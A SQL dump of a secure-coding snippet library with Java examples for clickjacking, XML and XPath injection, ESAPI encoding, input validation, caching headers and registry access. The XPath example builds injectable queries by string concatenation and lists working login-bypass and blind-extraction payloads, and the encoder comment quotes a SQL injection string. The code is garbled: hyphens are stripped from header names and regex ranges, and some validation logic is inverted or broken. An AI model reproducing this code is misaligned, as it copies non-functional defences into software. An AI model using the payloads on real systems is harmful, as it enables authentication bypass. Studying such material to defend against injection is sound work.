    In the document HEAD element, add the following:

    First apply an ID to the style element itself:
    */

    <style id="antiClickjack">body{display:none !important;}</style>

    //And then delete that style by its ID immediately after in the script:

    <script type="text/javascript">
    if (self === top) {
        var antiClickjack = document.getElementById("antiClickjack");
        antiClickjack.parentNode.removeChild(antiClickjack);
    } else {
        top.location = self.location;
    }
    </script>



    /*
    The second option is to use "security headers".
    There are two options for setting the "anticlickjacking" headers in your application:
    */

    //this will completely prevent your page from being displayed in an iframe.
    response.addHeader("XFrameOptions", "deny")


    //this will completely prevent your page from being displayed in an iframe on other sites.
    response.addHeader("XFrameOptions", "SAMEORIGIN")

', 'Anti clickjacking', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XML Injection Prevention 


 Example:


	package com.edw;

	import java.io.FileOutputStream;
	import java.io.IOException;
	import java.util.ArrayList;
	import javax.xml.parsers.DocumentBuilder;
	import javax.xml.parsers.DocumentBuilderFactory;
	import javax.xml.parsers.ParserConfigurationException;
	import javax.xml.transform.OutputKeys;
	import javax.xml.transform.Transformer;
	import javax.xml.transform.TransformerException;
	import javax.xml.transform.TransformerFactory;
	import javax.xml.transform.dom.DOMSource;
	import javax.xml.transform.stream.StreamResult;
	import com.edw.InputValidation; 

	import org.w3c.dom.Document;
	import org.w3c.dom.Element;

	public final class XMLPrevention {

		public void storeFunction(String name, String lastName, String gender)
		{
			/*
			First we import our InputValidation class. for more detailed information about 
			input validation check the code examples for "Input validation" & "Single input validation".
			*/
			InputValidation validate = new InputValidation();
			boolean  doFunction = true;
			//If the function returns false, we do not execute the function
			//see the "input validation" code example for more detailed information about this function
			if (validate.validateInput(name, "alphanumeric", "Invalid userinput name", "HIGH") == false)     { doFunction = false; }
			if (validate.validateInput(lastName, "alphanumeric", "Invalid userinput name", "HIGH") == false) { doFunction = false; }
			if (validate.validateInput(gender, "alphanumeric", "Invalid userinput name", "HIGH") == false)    { doFunction = false; }

			if (doFunction == true)
			{
				Document dom;
				Element e = null;
				String xml = null;

				// instance of a DocumentBuilderFactory
				DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
				try {
					// use factory to get an instance of document builder
					DocumentBuilder db = dbf.newDocumentBuilder();
					// create instance of DOM
					dom = db.newDocument();

					// create the root element
					Element rootEle = dom.createElement("roles");

					// create data elements and place them under root
					e = dom.createElement("name");
					e.appendChild(dom.createTextNode(name));
					rootEle.appendChild(e);

					e = dom.createElement("lastName");
					e.appendChild(dom.createTextNode(lastName));
					rootEle.appendChild(e);

					e = dom.createElement("gender");
					e.appendChild(dom.createTextNode(gender));
					rootEle.appendChild(e);

					dom.appendChild(rootEle);

					try {
						Transformer tr = TransformerFactory.newInstance().newTransformer();
						tr.setOutputProperty(OutputKeys.INDENT, "yes");
						tr.setOutputProperty(OutputKeys.METHOD, "xml");
						tr.setOutputProperty(OutputKeys.ENCODING, "UTF8");
						tr.setOutputProperty(OutputKeys.DOCTYPE_SYSTEM, "roles.dtd");
						tr.setOutputProperty("{http://xml.apache.org/xslt}indentamount", "4");

						// send DOM to file
						tr.transform(new DOMSource(dom),new StreamResult(new FileOutputStream(xml)));

					} catch (TransformerException te) {
						System.out.println(te.getMessage());
					} catch (IOException ioe) {
						System.out.println(ioe.getMessage());
					}
				} catch (ParserConfigurationException pce) {
					System.out.println("UsersXML: Error trying to instantiate DocumentBuilder " + pce);
				}
			}
		}
	}

	/*
	Now we prevented malicious user input from coming into your XML file.
	NOTE: Do not forget to also properly encode your input as a last line of defense, 
	 	  also In this example the XmlReader disables external entities by default.
		  If you should choose another parser make sure your parser disables these entities 
		  in order to prevent XXE injections.
	*/

', 'XMLPrevention', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XPathQuery


 Example:


	package prime.com.beans;

	import java.io.File;
	import java.io.FileInputStream;
	import java.io.IOException;
	import java.io.Serializable;
	import java.time.LocalDateTime;
	import java.util.UUID;

	import javax.faces.application.FacesMessage;
	import javax.faces.bean.ManagedBean;
	import javax.faces.bean.SessionScoped;
	import javax.faces.context.FacesContext;
	import javax.faces.event.ActionEvent;
	import javax.servlet.http.Cookie;
	import javax.servlet.http.HttpServletRequest;
	import javax.servlet.http.HttpServletResponse;
	import javax.xml.parsers.DocumentBuilder;
	import javax.xml.parsers.DocumentBuilderFactory;
	import javax.xml.xpath.XPath;
	import javax.xml.xpath.XPathConstants;
	import javax.xml.xpath.XPathExpression;
	import javax.xml.xpath.XPathFactory;

	import org.apache.log4j.Logger;
	import org.primefaces.context.RequestContext;
	import org.w3c.dom.Document;
	import org.xml.sax.InputSource;

	import com.Lib.AuditLog;
	import com.Lib.Hashing;
	import com.Lib.InputValidation; 

	@ManagedBean
	@SessionScoped
	public class Xpath  implements Serializable {
		
		private static final long serialVersionUID = 1L;
		//First we include the audit log class.
		AuditLog Log = new AuditLog();
			
		//Second we include the password hash.
		Hashing hash = new Hashing();
		
		final static Logger logger = Logger.getLogger(Xpath.class);
		public static String AUTH_KEY = "User: ";
		private String employeeID;
		private String employeeRole;
		private String username;
		private String password; 
		private String userID_result;
		private String userID;

		public String getUserID_result() {
			return userID_result;
		}

		public void setUserID_result(String userID_result) {
			this.userID_result = userID_result;
		}

		public String getUserID() {
			return userID;
		}

		public void setUserID(String userID) {
			this.userID = userID;
		}

		public String getUsername() {
			return username;
		}

		public void setUsername(String username) {
			this.username = username;
		}

		public String getPassword() {
			return password;
		}

		public void setPassword(String password) {
			this.password = password;
		}

		public String getEmployeeRole() {
			return employeeRole;
		}

		public void setEmployeeRole(String employeeRole) {
			this.employeeRole = employeeRole;
		}

		public String getEmployeeID() {
			return employeeID;
		}
	
		public void setEmployeeID(String employeeID) {
			this.employeeID = employeeID;
		}
		
		public void loginAction(String userId){
				
			//we include the random input validation class.
			HttpServletRequest origRequest = (HttpServletRequest)FacesContext.getCurrentInstance().getExternalContext().getRequest();
			HttpServletResponse origResponse = (HttpServletResponse)FacesContext.getCurrentInstance().getExternalContext().getResponse();
			FacesContext.getCurrentInstance().getExternalContext().getSessionMap().put(AUTH_KEY, username);
			
			String uname = this.getUsername(); 
	
			/*
			This is is to prevent session fixation, after login we create a new cookie which
			we then use to authenticate. This value can not be fixated since it is set after 
			login.

			create a new UUID and save into the session:
			*/
			UUID uuid = UUID.randomUUID();
			String randomUUIDString = uuid.toString();
			//initiate a session
			origRequest.getSession(true);
			origRequest.getSession().setAttribute("AuthToken", randomUUIDString);     	
			// now create a new cookie with this UUID value
			Cookie newCookie = new Cookie("AuthToken", randomUUIDString);   
			
			origResponse.addCookie(newCookie);
			
			//the connection has to be reported into the log files
			Log.SetLog("", "", "login was OK!", null, "SUCCESS", "NULL");    
				
			/*
			Put id in a session for query identifier based authentication
			See "identifier based authentication" code example for more information
			*/

			origRequest.getSession().setAttribute("userID", userId);
			FacesContext.getCurrentInstance().getExternalContext().getSessionMap().put(AUTH_KEY, uname);
		}
		
		//the following function used to check if the user exists 
		public String checkuser(File fXmlFile,String usrname){
			
			String type_result = null;
							
				try { 
					//The evaluate methods in the XPath and XPathExpression interfaces 
					//are used to parse an XML document with XPath expressions.					
					DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
					DocumentBuilder builder = factory.newDocumentBuilder();
					//Create an InputSource for the example XML document.
					//An InputSource is a input class for an XML entity.	        	    
					Document document = builder.parse(new InputSource(new FileInputStream(fXmlFile)));
					//The XPathFactory class is used to create an XPath object.
					//Create an XPathFactory object with the static newInstance method of the XPathFactory class.
					XPathFactory xPathfactory = XPathFactory.newInstance();
					//Create an XPath object from the XPathFactory object with the newXPath method.  
					XPath xpath = xPathfactory.newXPath();
					//Create and compile an XPath expression with the compile method of the XPath object. 
					//As an example, select the user ID attribute.
					//An attribute in an XPath expression is specified with an @ symbol. 
					//For further reference on XPath expressions, 
					//see the XPath specification for examples on creating an XPath expression.
					
					//The evaluate method of the XPathExpression interface evaluates
					//either an InputSource or a node/node list of the types org.w3c.dom.
					//Node, org.w3c.dom.NodeList, or org.w3c.dom.Document.
					//Evaluate the XPath expression with the InputSource of the example XML document to evaluate over.
	
					String type= "/Employees/Employee[UserName=''" + usrname + "'']/Type";
					XPathExpression salt_expr = xpath.compile(type);	              	    
					type_result = salt_expr.evaluate(document, XPathConstants.STRING).toString();  
		
					} catch (Exception e) {
						logger.error(" General error in executing xpath query :" + e.toString()); 
					}  		
				return type_result;	
		}
		
		public String xpathconnect(File fXmlFile,String usrname){
			
			String login_result = null;
							
				try { 
					//The evaluate methods in the XPath and XPathExpression interfaces 
					//are used to parse an XML document with XPath expressions.					
					DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
					DocumentBuilder builder = factory.newDocumentBuilder();
					//Create an InputSource for the example XML document.
					//An InputSource is a input class for an XML entity.	        	    
					Document document = builder.parse(new InputSource(new FileInputStream(fXmlFile)));
					//The XPathFactory class is used to create an XPath object.
					//Create an XPathFactory object with the static newInstance method of the XPathFactory class.
					XPathFactory xPathfactory = XPathFactory.newInstance();
					//Create an XPath object from the XPathFactory object with the newXPath method.  
					XPath xpath = xPathfactory.newXPath();
					//Create and compile an XPath expression with the compile method of the XPath object. 
					//As an example, select the user ID attribute.
					//An attribute in an XPath expression is specified with an @ symbol. 
					//For further reference on XPath expressions, 
					//see the XPath specification for examples on creating an XPath expression.
					
					//The evaluate method of the XPathExpression interface evaluates
					//either an InputSource or a node/node list of the types org.w3c.dom.
					//Node, org.w3c.dom.NodeList, or org.w3c.dom.Document.
					//Evaluate the XPath expression with the InputSource of the example XML document to evaluate over.	
														
					String salt= "/Employees/Employee[UserName=''" + usrname + "'']/salt";
					XPathExpression salt_expr = xpath.compile(salt);	              	    
					String Salt_result = salt_expr.evaluate(document, XPathConstants.STRING).toString();         	 
				
					String Password = hash.hashPassword(Salt_result, password);
					
					userID= "/Employees/Employee[UserName=''" + username + "'' and  Password=''" + Password + "'']/id";
					XPathExpression userID_expr = xpath.compile(userID);
					userID_result = userID_expr.evaluate(document, XPathConstants.STRING).toString();
					
					String login = "/Employees/Employee[UserName=''" + username + "'' and  Password=''" + Password + "'']/Type";   	    	        	    	        	 
					XPathExpression login_expr = xpath.compile(login);
					login_result = login_expr.evaluate(document, XPathConstants.STRING).toString(); 
					
				} catch (Exception e) {
					logger.error(" General error in executing xpath query :" + e.toString());
				}  
			return login_result;	
		}

		public void xpathLogin(ActionEvent event) throws IOException 
		{
			/*
			In order to prevent xpath injections we have to treat these query''s similar as 
			to the SQL query''s. An option would be to use a precompiled XPath query.
			But since this is a third party library i consider it untrusted and would
			rather use our own crafted escaping function.

			NOTE: if you want to look into the precompiled xpath library you can find more
			detailed information about it on: http://www.onjava.com/pub/a/onjava/2005/01/12/xpath.html
			*/

			/*
			As with every injection prevention we first focus on the expected user values
			in this case we expect an integer we use our single input validation method for integers
			See the "input validation" code example for more detailed information.

			For the purpose of this example we use the following XML snippet 
			
			<?xml version="1.0" encoding="utf8"?>
					<Employees>
					<Employee ID="1">
						<FirstName>Arnold</FirstName>
						<LastName>Baker</LastName>
						<UserName>ABaker</UserName>
						<id>1</id>
						<Password>Hv3KPG906xBBhE1z3k5QRD9SArIYLeiSFA==</Password>  <! SoSecure >
						<salt>+yoY1sPd+V6SC+0aEiA9lHjV9EC8zOCw+A==</salt>
						<Type>Admin</Type>
					</Employee>
					<Employee ID="2">
						<FirstName>Peter</FirstName>
						<LastName>Pan</LastName>
						<UserName>PPan</UserName>
						<id>2</id>
						<Password>Cftv1ip25PJdmf8DdfU5NM/K/cjEqEAthw==</Password>  <! NoTelling >
						<salt>/KAMdM09RVNZ8nOWHAsqKzrfyY6VEZgRQA==</salt>
						<Type>User</Type>
					</Employee>
					</Employees>
							
							
			How to exploit : 
			
			With a normal username and password this XPath would work, but an attacker may send a bad username and password and get an XML node selected without knowing the username or password, like this:
			
			Username: blah'' or 1=1 or ''a''=''a
			Password: blah

			or if the following exploit used, it matches the first letter of the username which is A. In such case it just ignores the password and permits login. 
			
			username : '' or substring((//Employee[position()=1]/child::node()[position()=2]),1,1)="A" or ''''=''
			password : blah
			
			another exploitation example is using the following query which will be true if the second string (password) of the first node (user ''Arnold'') 
			consists of 36 characters (hash).
			
			stringlength(//user[position()=1]/child::node()[position()=2])=36 or ''''=''
			
			in order to test any of the above exploit cases just comment out the input validation lines 207 and 210 below.
			
			*/
			RequestContext context = RequestContext.getCurrentInstance();
			FacesMessage message = null;
			boolean loggedIn = false;
			boolean continueFunction = true;         
			InputValidation validate = new InputValidation();
	
			//Here we put the variable in our input validation method in order to prevent untrusted user input from parsing
			//NOTE: logging and countering is also done in your validation method
			
			//Input used into an XPATH expression must not contains any of the characters below:

			//	 ( ) = '' [ ] : , * / WHITESPACE
			
			//Another method of avoiding XPath injections is by using variable into XPATH expression with a variable resolver enabled evaluator. 
			//See XPath parameterization example
			
			if (validate.validateInput(username,username,"symbols", "xpath input validation for username", "HIGH") == false) 
			{ continueFunction = false; }
			
			if (validate.validateInput(username,password,"symbols", "xpath input validation for password", "HIGH") == false) 
			{ continueFunction = false; }
		
			//Only if our validation function returned true we put the user input in the function
			//fXmlFile is the java.io.File object of the example XML document.
			
			File fXmlFile = new File("C:\\xmldb\\users.xml");
			
			if (continueFunction == true)
			{     	     	 
				String login_result = this.xpathconnect(fXmlFile,username);
				if (login_result.equals(""))
				{
					//the connection has to be reported into the log files
					Log.SetLog(username, "", "Login failed!", LocalDateTime.now(), "FAIL", "NULL");
					message = new FacesMessage(FacesMessage.SEVERITY_WARN, "Logging Error", "Invalid credentials"); 
					FacesContext.getCurrentInstance().getExternalContext().redirect("xpath.xhtml");
				}
				else if (login_result.equals("Admin"))
				{
					this.loginAction(userID_result);
					//the connection has to be reported into the log files
					Log.SetLog(username, "", "Login successfully!", LocalDateTime.now(), "SUCCESS", "");
					loggedIn = true;
					message = new FacesMessage(FacesMessage.SEVERITY_INFO, "Welcome", username);
					FacesContext.getCurrentInstance().getExternalContext().redirect("admin_page.xhtml");
				}
				else if (login_result.equals("User"))
				{
					this.loginAction(userID_result);
					Log.SetLog(username, "", "Login successfully!", LocalDateTime.now(), "SUCCESS", "");
					loggedIn = true;
					message = new FacesMessage(FacesMessage.SEVERITY_INFO, "Welcome", username);
					FacesContext.getCurrentInstance().getExternalContext().redirect("user_page.xhtml");
				}	
				FacesContext.getCurrentInstance().addMessage(null, message);
				context.addCallbackParam("loggedIn", loggedIn);
			}         
		}
	}

', 'X Path query', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Encoder (SQL  ESAPI)


 Example:


	package com.edw;

	import java.time.LocalDateTime;
	import java.util.regex.Matcher;
	import java.util.regex.Pattern;
	import org.owasp.esapi.ESAPI;
	import org.owasp.esapi.codecs.MySQLCodec;

	public final class Encoding {
		
		AuditLog Log = new AuditLog(); 
		
		public String encoder(String input , String allowed, String user_id)
		{	
		    /*
			We can specify also special characters which allowed in order to keep
			track of any unwanted special characters
			
			Example :
			
			To keep malicious inputs contained, any inputs written to the database need to be encoded.
			SQL encoding: '' OR 1=1 '' is encoded to \'' OR 1\=1 \\\''
			
			*/
			String pattern = "^[azAZ09" + allowed + "]+$";
			// Create a Pattern object
			Pattern reg = Pattern.compile(pattern);
			// Now create matcher object.
			Matcher match = reg.matcher(input);
			if (!match.find()) {	
			    Log.SetLog(user_id, "Illegal characters", "FAIL", LocalDateTime.now(),  "HIGH");
			}		
			//We return the user input encoded	      
			return ESAPI.encoder().encodeForSQL(new MySQLCodec(MySQLCodec.MYSQL_MODE), input);
		}
	}
', 'Encoder SQL ESAPI', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Single input validation control 


 Example:


	import java.time.LocalDateTime;
	import java.util.regex.Matcher;
	import java.util.regex.Pattern;

	public final class InputValidation {
		
		private AuditLog Log = new AuditLog(); 
		private String validate = "pass"; 
		
		public String validateInput(String user_id,String input, String type, String logMessage, String remote_address, String threatLevel)
		{
			/*
			we want to filter the filenames for expected values. For this example we use only az/09
			Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.           
			*/
			String validator = "";
			if(type.equals("symbols"))
			{
				//Characters that may be used to interfere with the XPath query should be blocked, including ( ) = ‘ [ ] : , * / and all whitespace. 
				// Any input that does not match the white list should be rejected, not sanitized.
				
				validator = "(.*)(\\W+)(\\D+)(\\s+)(.*)";
			}
			else if (type.equals("alphanumeric"))		 
					validator = "^[azAZ09]";
			else if (type.equals("numeric"))
				//"^[09]*$";
				validator = "(\\d+)";
			else
				validator = "";

			// Create a Pattern object
			Pattern reg = Pattern.compile(validator);
			// Now create matcher object.
			Matcher match = reg.matcher(input);
			if (!match.find()) 
			{	
				//If there was a match this function returns "pass"
				validate = "validation failed"; 
			
				//this breach has to be reported into the log files
				Log.SetLog(user_id, logMessage , "FAIL", LocalDateTime.now(), remote_address, rLevel);
				
				/*
				Set counter; if counter hits 3, the user''s session must be terminated.
				After 3 hits the user''s account must be blocked.
				For detailed information see the "Audit logs" in code examples.
				*/
				
				String result = Log.counter(1,Integer.parseInt(user_id));
				
				if (result.equals("SQL insert query error in update access" ))
				{
					Log.SetLog(user_id, logMessage , "SQL insert query error in update access", LocalDateTime.now(),remote_address,  "");
				}
				if (result.equals("block"))
				{
					Log.SetLog(user_id, logMessage , "block", LocalDateTime.now(), remote_address,  "HIGH");
					validate = "block";
				}
				if (result.equals("terminate"))
				{
					Log.SetLog(user_id, logMessage , "terminate", LocalDateTime.now(), remote_address,  "HIGH");
					validate = "terminate";
				}
				else if (validate.equals("validation failed"))
				{
					Log.SetLog(user_id, logMessage , "validation failed", LocalDateTime.now(), remote_address,  "HIGH");
				}
			}		
			return validate;
		}	 
		
		public boolean validateInput(String username, String input, String type, String logMessage, String threatLevel)
		{
			/*
			we want to filter the filenames for expected values. For this example we use only az/09
			Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.           
			*/
			String validator = "";
			
			if(type.equals("symbols"))
			{
				//Characters that may be used to interfere with the XPath query should be blocked, including ( ) = ‘ [ ] : , * / and all whitespace. 
				// Any input that does not match the white list should be rejected, not sanitized.
				//validator = "^()=''\\[\\]:,\\*/ $";
				validator = "(.*)(\\W+)(\\D+)(\\s+)(.*)";
				
			}
			else if (type.equals("alphanumeric"))		  
			validator = "^[azAZ09]";
			else if (type.equals("numeric"))
				//"^[09]*$";
				validator = "(\\d+)";
			else
				validator = "";

			// Create a Pattern object
			Pattern reg = Pattern.compile(validator);
			boolean validate = false ; 
			// Now create matcher object.
			Matcher match = reg.matcher(input);
			if (!match.find()) 
			{	
				//If there was a match this function returns false
				validate = true; 
			
				//this breach has to be reported into the log files
				Log.SetLog(username, logMessage , "SUCCESS", LocalDateTime.now(),  threatLevel);   
			}else{
					Log.SetLog(username, logMessage , "FAIL", LocalDateTime.now(), "NULL");
			}        
			return validate;
		}	 
	}

', 'Single input validation control', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Anticashing headers 


 Example:


    /*
    Add the following headers to your application head in order to prevent the browser from caching
    the following code could be used in your controller:
    */

    response.appendHeader("CacheControl", "nocache, nostore, mustrevalidate"); // HTTP 1.1.
    response.appendHeader("Pragma", "nocache"); // HTTP 1.0.
    response.appendHeader("Expires", "0"); // Proxies.
    
', 'Anti caching headers', 'java'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Reading from Windows Registry 


 Example:


    package com.edw;

    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    import java.util.HashMap;
    import java.util.Map;
    import java.util.ArrayList;
    import java.util.List;
    import java.util.prefs.Preferences;

    public final class WinRegistry {

      public static final int HKEY_CURRENT_USER = 0x80000001;
      public static final int HKEY_LOCAL_MACHINE = 0x80000002;
      public static final int HKEY_CLASSES_ROOT = 0x80000003;  
      public static final int REG_SUCCESS = 0;
      public static final int REG_NOTFOUND = 2;
      public static final int REG_ACCESSDENIED = 5;

      private static final int KEY_ALL_ACCESS = 0xf003f;
      private static final int KEY_READ = 0x20019;
      private static final Preferences userRoot = Preferences.userRoot();
      private static final Preferences systemRoot = Preferences.systemRoot();
      private static final Class<? extends Preferences> userClass = userRoot.getClass();
      private static final Method regOpenKey;
      private static final Method regCloseKey;
      private static final Method regQueryValueEx;
      private static final Method regEnumValue;
      private static final Method regQueryInfoKey;
      private static final Method regEnumKeyEx;
      private static final Method regCreateKeyEx;
      private static final Method regSetValueEx;
      private static final Method regDeleteKey;
      private static final Method regDeleteValue;

      static {
          try {
              regOpenKey = userClass.getDeclaredMethod("WindowsRegOpenKey",
                  new Class[] { int.class, byte[].class, int.class });
              regOpenKey.setAccessible(true);
              regCloseKey = userClass.getDeclaredMethod("WindowsRegCloseKey",
                  new Class[] { int.class });
              regCloseKey.setAccessible(true);
              regQueryValueEx = userClass.getDeclaredMethod("WindowsRegQueryValueEx",
                  new Class[] { int.class, byte[].class });
              regQueryValueEx.setAccessible(true);
              regEnumValue = userClass.getDeclaredMethod("WindowsRegEnumValue",
                  new Class[] { int.class, int.class, int.class });
              regEnumValue.setAccessible(true);
              regQueryInfoKey = userClass.getDeclaredMethod("WindowsRegQueryInfoKey1",
                  new Class[] { int.class });
              regQueryInfoKey.setAccessible(true);
              regEnumKeyEx = userClass.getDeclaredMethod(  
                  "WindowsRegEnumKeyEx", new Class[] { int.class, int.class, int.class });  
              regEnumKeyEx.setAccessible(true);
              regCreateKeyEx = userClass.getDeclaredMethod(  
                  "WindowsRegCreateKeyEx", new Class[] { int.class, byte[].class });  
              regCreateKeyEx.setAccessible(true);  
              regSetValueEx = userClass.getDeclaredMethod(  
                  "WindowsRegSetValueEx", new Class[] { int.class, byte[].class, byte[].class });  
              regSetValueEx.setAccessible(true); 
              regDeleteValue = userClass.getDeclaredMethod(  
                  "WindowsRegDeleteValue", new Class[] { int.class, byte[].class });  
              regDeleteValue.setAccessible(true); 
              regDeleteKey = userClass.getDeclaredMethod(  
                  "WindowsRegDeleteKey", new Class[] { int.class, byte[].class });  
              regDeleteKey.setAccessible(true); 
          }
          catch (Exception e) {
              throw new RuntimeException(e);
          }
      }

      private WinRegistry() {  }

      /**
      * Read a value from key and value name
      * @param hkey   HKEY_CURRENT_USER/HKEY_LOCAL_MACHINE
      * @param key
      * @param valueName
      * @return the value
      * @throws IllegalArgumentException
      * @throws IllegalAccessException
      * @throws InvocationTargetException
      */
      public static String readString(int hkey, String key, String valueName) 
          throws IllegalArgumentException, IllegalAccessException, InvocationTargetException 
      {
          if (hkey == HKEY_LOCAL_MACHINE) 
          {
              return readString(systemRoot, hkey, key, valueName);
          }
          else if (hkey == HKEY_CURRENT_USER) 
          {
              return readString(userRoot, hkey, key, valueName);
          }
          else if (hkey == HKEY_CLASSES_ROOT) 
          {
              return readString(userRoot, hkey, key, valueName);
          }else{
              throw new IllegalArgumentException("hkey=" + hkey);
          }
      }

      /**
      * Read value(s) and value name(s) form given key 
      * @param hkey  HKEY_CURRENT_USER/HKEY_LOCAL_MACHINE
      * @param key
      * @return the value name(s) plus the value(s)
      * @throws IllegalArgumentException
      * @throws IllegalAccessException
      * @throws InvocationTargetException
      */
      public static Map<String, String> readStringValues(int hkey, String key) 
        throws IllegalArgumentException, IllegalAccessException, InvocationTargetException 
      {
          if (hkey == HKEY_LOCAL_MACHINE) 
          {
              return readStringValues(systemRoot, hkey, key);
          }
          else if (hkey == HKEY_CURRENT_USER) 
          {
              return readStringValues(userRoot, hkey, key);
          }
          else if (hkey == HKEY_CLASSES_ROOT) 
          {
              return readStringValues(userRoot, hkey, key);
          }else{
              throw new IllegalArgumentException("hkey=" + hkey);
          }
      }

      /**
      * Read the value name(s) from a given key
      * @param hkey  HKEY_CURRENT_USER/HKEY_LOCAL_MACHINE/HKEY_CLASSES_ROOT
      * @param key
      * @return the value name(s)
      * @throws IllegalArgumentException
      * @throws IllegalAccessException
      * @throws InvocationTargetException
      */
      public static List<String> readStringSubKeys(int hkey, String key) 
          throws IllegalArgumentException, IllegalAccessException, InvocationTargetException 
      {
          if (hkey == HKEY_LOCAL_MACHINE) 
          {
              return readStringSubKeys(systemRoot, hkey, key);
          }
          else if (hkey == HKEY_CURRENT_USER) 
          {
              return readStringSubKeys(userRoot, hkey, key);
          }
          else if (hkey == HKEY_CLASSES_ROOT) 
          {
              return readStringSubKeys(userRoot, hkey, key);
          }else{
              throw new IllegalArgumentException("hkey=" + hkey);
          }
      }

      /**
      * Create a key
      * @param hkey  HKEY_CURRENT_USER/HKEY_LOCAL_MACHINE
      * @param key
      * @throws IllegalArgumentException
      * @throws IllegalAccessException
      * @throws InvocationTargetException
      */
      public static void createKey(int hkey, String key) 
        throws IllegalArgumentException, IllegalAccessException, InvocationTargetException 
      {
          int [] ret;
          if (hkey == HKEY_LOCAL_MACHINE) 
          {
              ret = createKey(systemRoot, hkey, key);
              regCloseKey.invoke(systemRoot, new Object[] { new Integer(ret[0]) });
          }
          else if (hkey == HKEY_CURRENT_USER) 
          {
              ret = createKey(userRoot, hkey, key);
              regCloseKey.invoke(userRoot, new Object[] { new Integer(ret[0]) });
          }
          else if (hkey == HKEY_CLASSES_ROOT) 
          {
              ret = createKey(userRoot, hkey, key);
              regCloseKey.invoke(userRoot, new Object[] { new Integer(ret[0]) });
          }else{
              throw new IllegalArgumentException("hkey=" + hkey);
          }
          if (ret[1] != REG_SUCCESS) 
          {
              throw new IllegalArgumentException("rc=" + ret[1] + "  key=" + key);
          }
      }

      /**
      * Write a value in a given key/value name
      * @param hkey
      * @param key
      * @param valueName
      * @param value
      * @throws IllegalArgumentException
      * @throws IllegalAccessException
      * @throws InvocationTargetException
      */
      public static void writeStringValue
        (int hkey, String key, String valueName, String value) 
          throws IllegalArgumentException, IllegalAccessException, InvocationTargetException 
      {
          if (hkey == HKEY_LOCAL_MACHINE) 
          {
               writeStringValue(systemRoot, hkey, key, valueName, value);
          }
          else if (hkey == HKEY_CURRENT_USER) 
          {
               writeStringValue(userRoot, hkey, key, valueName, value);
          }
          else if (hkey == HKEY_CLASSES_ROOT) 
          {
                writeStringValue(userRoot, hkey, key, valueName, value);
          }else{
                throw new IllegalArgumentException("hkey=" + hkey);
          }
      }

      /**
      * Delete a given key
      * @param hkey
      * @param key
      * @throws IllegalArgumentException
      * @throws IllegalAccessException
      * @throws InvocationTargetException
      */
      public static void deleteKey(int hkey, String key) 
        throws IllegalArgumentException, IllegalAccessException, InvocationTargetException 
      {
          int rc = 1;
          if (hkey == HKEY_LOCAL_MACHINE) 
          {
              rc = deleteKey(systemRoot, hkey, key);
          }
          else if (hkey == HKEY_CURRENT_USER) 
          {
              rc = deleteKey(userRoot, hkey, key);
          }
          else if (hkey == HKEY_CLASSES_ROOT) 
          {
              rc = deleteKey(userRoot, hkey, key);
          }
          if (rc != REG_SUCCESS) 
          {
              throw new IllegalArgumentException("rc=" + rc + "  key=" + key);
          }
      }

      /**
      * delete a value from a given key/value name
      * @param hkey
      * @param key
      * @param value
      * @throws IllegalArgumentException
      * @throws IllegalAccessException
      * @throws InvocationTargetException
      */
      public static void deleteValue(int hkey, String key, String value) 
        throws IllegalArgumentException, IllegalAccessException, InvocationTargetException 
      {
          int rc = 1;
          if (hkey == HKEY_LOCAL_MACHINE) 
          {
              rc = deleteValue(systemRoot, hkey, key, value);
          }
          else if (hkey == HKEY_CURRENT_USER) 
          {
              rc = deleteValue(userRoot, hkey, key, value);
          }
          else if (hkey == HKEY_CLASSES_ROOT) 
          {
              rc = deleteValue(userRoot, hkey, key, value);
          }
          if (rc != REG_SUCCESS) 
          {
              throw new IllegalArgumentException("rc=" + rc + "  key=" + key + "  value=" + value);
          }
      }

      private static int deleteValue
        (Preferences root, int hkey, String key, String value)
          throws IllegalArgumentException, IllegalAccessException, InvocationTargetException 
      {
          int[] handles = (int[]) regOpenKey.invoke(root, new Object[] {
              new Integer(hkey), toCstr(key), new Integer(KEY_ALL_ACCESS) });
          if (handles[1] != REG_SUCCESS) 
          {
              return handles[1];  // can be REG_NOTFOUND, REG_ACCESSDENIED
          }
          int rc =((Integer) regDeleteValue.invoke(root,  
              new Object[] { 
                  new Integer(handles[0]), toCstr(value) 
              })).intValue();
          regCloseKey.invoke(root, new Object[] { new Integer(handles[0]) });
          return rc;
      }

      private static int deleteKey(Preferences root, int hkey, String key) 
          throws IllegalArgumentException, IllegalAccessException, InvocationTargetException 
      {
          int rc =((Integer) regDeleteKey.invoke(root,  
              new Object[] { new Integer(hkey), toCstr(key) })).intValue();
          return rc;  // can REG_NOTFOUND, REG_ACCESSDENIED, REG_SUCCESS
      }

      private static String readString(Preferences root, int hkey, String key, String value)
          throws IllegalArgumentException, IllegalAccessException, InvocationTargetException 
      {
          int[] handles = (int[]) regOpenKey.invoke(root, new Object[] {
              new Integer(hkey), toCstr(key), new Integer(KEY_READ) });
          if (handles[1] != REG_SUCCESS) 
          {
              return null; 
          }
          byte[] valb = (byte[]) regQueryValueEx.invoke(root, new Object[] {
              new Integer(handles[0]), toCstr(value) });
          regCloseKey.invoke(root, new Object[] { new Integer(handles[0]) });
          return (valb != null ? new String(valb).trim() : null);
      }

      private static Map<String,String> readStringValues
        (Preferences root, int hkey, String key)
        throws IllegalArgumentException, IllegalAccessException,
        InvocationTargetException 
      {
        HashMap<String, String> results = new HashMap<String,String>();
        int[] handles = (int[]) regOpenKey.invoke(root, new Object[] {
            new Integer(hkey), toCstr(key), new Integer(KEY_READ) });
        if (handles[1] != REG_SUCCESS) 
        {
            return null;
        }
        int[] info = (int[]) regQueryInfoKey.invoke(root,
            new Object[] { new Integer(handles[0]) });

        int count = info[0]; // count  
        int maxlen = info[3]; // value length max
        for(int index=0; index<count; index++)  {
            byte[] name = (byte[]) regEnumValue.invoke(root, new Object[] {
                new Integer
